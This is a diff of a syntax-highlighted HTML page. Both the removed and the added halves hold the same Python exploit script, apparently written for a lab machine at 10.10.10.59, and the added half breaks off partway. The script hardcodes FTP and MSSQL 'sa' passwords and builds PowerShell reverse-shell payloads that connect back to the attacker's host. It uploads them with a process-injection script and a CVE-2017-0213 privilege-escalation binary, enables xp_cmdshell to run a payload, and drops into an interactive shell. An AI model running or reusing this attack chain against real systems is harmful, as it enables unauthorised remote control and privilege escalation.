-<span class="n">FTP_PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;UTDRSCH53c</span><span class="se">\&#34;</span><span class="s2">$6hys&#34;</span>
-<span class="n">FTP_UPLOADPATH</span> <span class="o">=</span> <span class="s2">&#34;Intranet&#34;</span>
-<span class="n">MSSQL_SERVER</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.59:1433&#34;</span>
-<span class="n">MSSQL_USERNAME</span> <span class="o">=</span> <span class="s2">&#34;sa&#34;</span>
-<span class="n">MSSQL_PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;GWE3V65#6KFH93@4GWTG2G&#34;</span>
-<span class="n">TIMEOUT</span> <span class="o">=</span> <span class="mi">60</span>
-
-
-<span class="k">def</span> <span class="nf">get_ps_payload</span><span class="p">(</span><span class="n">lost</span><span class="p">,</span> <span class="n">lport</span><span class="p">):</span>
-    <span class="k">return</span> <span class="s2">&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&#34;</span><span class="o">+</span><span class="n">lost</span><span class="o">+</span><span class="s2">&#34;&#39;,&#34;</span><span class="o">+</span><span class="n">lport</span><span class="o">+</span><span class="s2">&#34;); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%</span><span class="si">{0}</span><span class="s2">; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + &#39;PS &#39; + (pwd).Path; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();&#34;</span>
-
-<span class="n">payload1</span> <span class="o">=</span> <span class="n">get_ps_payload</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT1</span><span class="p">)</span>
-<span class="n">payload2</span> <span class="o">=</span> <span class="n">get_ps_payload</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT2</span><span class="p">)</span>
-<span class="n">payload3</span> <span class="o">=</span> <span class="n">get_ps_payload</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT3</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">initiate</span><span class="p">():</span>
-    <span class="n">unique_filename1</span> <span class="o">=</span> <span class="s2">&#34;msf1.ps1&#34;</span>
-    <span class="n">unique_filename2</span> <span class="o">=</span> <span class="s2">&#34;msf2.ps1&#34;</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename1</span><span class="p">,</span><span class="s1">&#39;wt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename2</span><span class="p">,</span><span class="s1">&#39;wt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
-        
-    <span class="n">ftp</span> <span class="o">=</span> <span class="kc">None</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">ftp</span> <span class="o">=</span> <span class="n">ftplib</span><span class="o">.</span><span class="n">FTP</span><span class="p">(</span><span class="n">FTP_SERVER</span><span class="p">,</span><span class="n">FTP_USERNAME</span><span class="p">,</span><span class="n">FTP_PASSWORD</span><span class="p">)</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Successful login at ftp server &#34;</span><span class="o">+</span><span class="n">FTP_SERVER</span><span class="o">+</span><span class="s2">&#34; with username &#39;&#34;</span><span class="o">+</span><span class="n">FTP_USERNAME</span><span class="o">+</span><span class="s2">&#34;&#39; and password &#39;&#34;</span><span class="o">+</span><span class="n">FTP_PASSWORD</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Changing current working directory to &#34;</span> <span class="o">+</span> <span class="n">FTP_UPLOADPATH</span><span class="p">)</span>
-        <span class="n">ftp</span><span class="o">.</span><span class="n">cwd</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="p">)</span>
-        
-        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading &#34;</span><span class="o">+</span><span class="n">unique_filename1</span><span class="p">)</span>
-        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename1</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
-            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s1">&#39;STOR &#39;</span><span class="o">+</span><span class="n">unique_filename1</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
-
-        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading Invoke-PSInject.ps1&#34;</span><span class="p">)</span>
-        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;Invoke-PSInject.ps1&#34;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
-            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s2">&#34;STOR Invoke-PSInject.ps1&#34;</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
-            
-        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading &#34;</span><span class="o">+</span><span class="n">unique_filename2</span><span class="p">)</span>
-        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename2</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
-            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s1">&#39;STOR &#39;</span><span class="o">+</span><span class="n">unique_filename2</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
-            
-        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading cve2017213ps.exe&#34;</span><span class="p">)</span>
-        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;cve2017213ps.exe&#34;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
-            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s2">&#34;STOR cve2017213ps.exe&#34;</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
-
-            
-    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;FTP failed: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
-    <span class="k">finally</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">ftp</span><span class="p">:</span>
-            <span class="n">ftp</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
-
-
-    <span class="n">mssql</span> <span class="o">=</span> <span class="kc">None</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">mssql</span> <span class="o">=</span> <span class="n">_mssql</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server</span><span class="o">=</span><span class="n">MSSQL_SERVER</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">MSSQL_USERNAME</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">MSSQL_PASSWORD</span><span class="p">)</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Successful login at mssql server &#34;</span><span class="o">+</span><span class="n">MSSQL_SERVER</span><span class="o">+</span><span class="s2">&#34; with username &#39;&#34;</span><span class="o">+</span><span class="n">MSSQL_USERNAME</span><span class="o">+</span><span class="s2">&#34;&#39; and password &#39;&#34;</span><span class="o">+</span><span class="n">MSSQL_PASSWORD</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Enabling &#39;xp_cmdshell&#39;&#34;</span><span class="p">)</span>
-        <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec SP_CONFIGURE &#39;xp_cmdshell&#39;, 1;RECONFIGURE -- &#34;</span><span class="p">)</span>
-        <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC master..xp_cmdshell &#39;powershell -ExecutionPolicy bypass -NoExit -File C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">unique_filename1</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
-    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;MSSQL failed: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
-    <span class="k">finally</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">mssql</span><span class="p">:</span>
-            <span class="n">mssql</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-
-
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LHOST = &#34;</span><span class="o">+</span><span class="n">LHOST</span><span class="p">)</span>
-
-<span class="k">try</span><span class="p">:</span>
-    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">initiate</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
-    
-<span class="n">ps1</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
-<span class="k">if</span> <span class="n">ps1</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
-<span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cd C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;. .</span><span class="se">\\</span><span class="s2">Invoke-PSInject.ps1&#34;</span><span class="p">)</span>
-<span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;Invoke-PSInject -ProcName sihost -PoshCode &#34;</span><span class="o">+</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload2</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;UTF-16LE&#39;</span><span class="p">)))</span>
-
-<span class="n">ps2</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
-<span class="k">if</span> <span class="n">ps2</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
-<span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;copy C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">cve2017213ps.exe C:</span><span class="se">\\</span><span class="s2">TEMP</span><span class="se">\\</span><span class="s2">cve2017213ps.exe&#34;</span><span class="p">)</span>
-<span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cd C:</span><span class="se">\\</span><span class="s2">TEMP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;. .</span><span class="se">\\</span><span class="s2">cve2017213ps.exe&#34;</span><span class="p">)</span>
-
-<span class="n">ps3</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT3</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
-<span class="k">if</span> <span class="n">ps3</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
-<span class="n">ps3</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-
-<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span></code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Author: Alamot</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">fcntl</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">_mssql</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">signal</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ftplib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
+</span></span><span class="line"><span class="cl"><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_DFL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_ip_address</span><span class="p">(</span><span class="n">ifname</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">fcntl</span><span class="o">.</span><span class="n">ioctl</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x8915</span><span class="p">,</span>  <span class="c1"># SIOCGIFADDR</span>
+</span></span><span class="line"><span class="cl">        <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;256s&#39;</span><span class="p">,</span> <span class="n">ifname</span><span class="p">[:</span><span class="mi">15</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)[</span><span class="mi">20</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#LHOST = &#34;10.10.15.247&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LHOST</span> <span class="o">=</span> <span class="n">get_ip_address</span><span class="p">(</span><span class="s1">&#39;tun0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">LPORT1</span><span class="o">=</span><span class="s2">&#34;60000&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LPORT2</span><span class="o">=</span><span class="s2">&#34;60001&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LPORT3</span><span class="o">=</span><span class="s2">&#34;60002&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">FTP_SERVER</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.59&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">FTP_USERNAME</span> <span class="o">=</span> <span class="s2">&#34;ftp_user&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">FTP_PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;UTDRSCH53c</span><span class="se">\&#34;</span><span class="s2">$6hys&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">FTP_UPLOADPATH</span> <span class="o">=</span> <span class="s2">&#34;Intranet&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">MSSQL_SERVER</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.59:1433&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">MSSQL_USERNAME</span> <span class="o">=</span> <span class="s2">&#34;sa&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">MSSQL_PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;GWE3V65#6KFH93@4GWTG2G&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">TIMEOUT</span> <span class="o">=</span> <span class="mi">60</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_ps_payload</span><span class="p">(</span><span class="n">lost</span><span class="p">,</span> <span class="n">lport</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&#34;</span><span class="o">+</span><span class="n">lost</span><span class="o">+</span><span class="s2">&#34;&#39;,&#34;</span><span class="o">+</span><span class="n">lport</span><span class="o">+</span><span class="s2">&#34;); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%</span><span class="si">{0}</span><span class="s2">; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + &#39;PS &#39; + (pwd).Path; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">get_ps_payload</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">get_ps_payload</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span> <span class="n">get_ps_payload</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">initiate</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">unique_filename1</span> <span class="o">=</span> <span class="s2">&#34;msf1.ps1&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">unique_filename2</span> <span class="o">=</span> <span class="s2">&#34;msf2.ps1&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename1</span><span class="p">,</span><span class="s1">&#39;wt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename2</span><span class="p">,</span><span class="s1">&#39;wt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="n">ftp</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ftp</span> <span class="o">=</span> <span class="n">ftplib</span><span class="o">.</span><span class="n">FTP</span><span class="p">(</span><span class="n">FTP_SERVER</span><span class="p">,</span><span class="n">FTP_USERNAME</span><span class="p">,</span><span class="n">FTP_PASSWORD</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Successful login at ftp server &#34;</span><span class="o">+</span><span class="n">FTP_SERVER</span><span class="o">+</span><span class="s2">&#34; with username &#39;&#34;</span><span class="o">+</span><span class="n">FTP_USERNAME</span><span class="o">+</span><span class="s2">&#34;&#39; and password &#39;&#34;</span><span class="o">+</span><span class="n">FTP_PASSWORD</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Changing current working directory to &#34;</span> <span class="o">+</span> <span class="n">FTP_UPLOADPATH</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ftp</span><span class="o">.</span><span class="n">cwd</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading &#34;</span><span class="o">+</span><span class="n">unique_filename1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename1</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
+</span></span><span class="line"><span class="cl">            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s1">&#39;STOR &#39;</span><span class="o">+</span><span class="n">unique_filename1</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading Invoke-PSInject.ps1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;Invoke-PSInject.ps1&#34;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
+</span></span><span class="line"><span class="cl">            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s2">&#34;STOR Invoke-PSInject.ps1&#34;</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading &#34;</span><span class="o">+</span><span class="n">unique_filename2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">unique_filename2</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
+</span></span><span class="line"><span class="cl">            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s1">&#39;STOR &#39;</span><span class="o">+</span><span class="n">unique_filename2</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading cve2017213ps.exe&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;cve2017213ps.exe&#34;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>         
+</span></span><span class="line"><span class="cl">            <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s2">&#34;STOR cve2017213ps.exe&#34;</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;FTP failed: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">ftp</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ftp</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">mssql</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mssql</span> <span class="o">=</span> <span class="n">_mssql</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server</span><span class="o">=</span><span class="n">MSSQL_SERVER</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">MSSQL_USERNAME</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">MSSQL_PASSWORD</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Successful login at mssql server &#34;</span><span class="o">+</span><span class="n">MSSQL_SERVER</span><span class="o">+</span><span class="s2">&#34; with username &#39;&#34;</span><span class="o">+</span><span class="n">MSSQL_USERNAME</span><span class="o">+</span><span class="s2">&#34;&#39; and password &#39;&#34;</span><span class="o">+</span><span class="n">MSSQL_PASSWORD</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Enabling &#39;xp_cmdshell&#39;&#34;</span><span class="p">)</span>
